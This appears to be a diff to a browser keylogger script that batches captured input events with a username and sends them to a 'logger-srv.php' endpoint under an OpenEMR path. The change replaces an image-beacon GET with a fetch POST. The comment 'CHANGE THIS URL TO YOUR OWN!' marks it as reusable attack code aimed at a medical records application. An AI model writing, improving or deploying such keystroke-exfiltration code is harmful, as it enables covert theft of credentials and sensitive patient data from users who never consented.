@@ -24,10 +24,10 @@ window.addEventListener("wheel", logEvent);
 // You can also set this to send only if certain number of key stroke were made.
 window.setInterval(function () {
   if (events.length>5) {
-    var data = encodeURIComponent(JSON.stringify({ user: vliegtuig_username, events: events }));
-    //encodeURIComponent
-    console.log(data);
-    new Image().src = "/openemr/keylogger/logger-srv.php?k=" + data; // CHANGE THIS URL TO YOUR OWN!
-    events = [];
+      eventsToSend = events;
+      events = [];
+      var data = JSON.stringify({ user: vliegtuig_username, events: eventsToSend });
+      console.log(data);
+      fetch("/openemr/keylogger/logger-srv.php", { method: 'post', body: data });
   }
 }, 500);
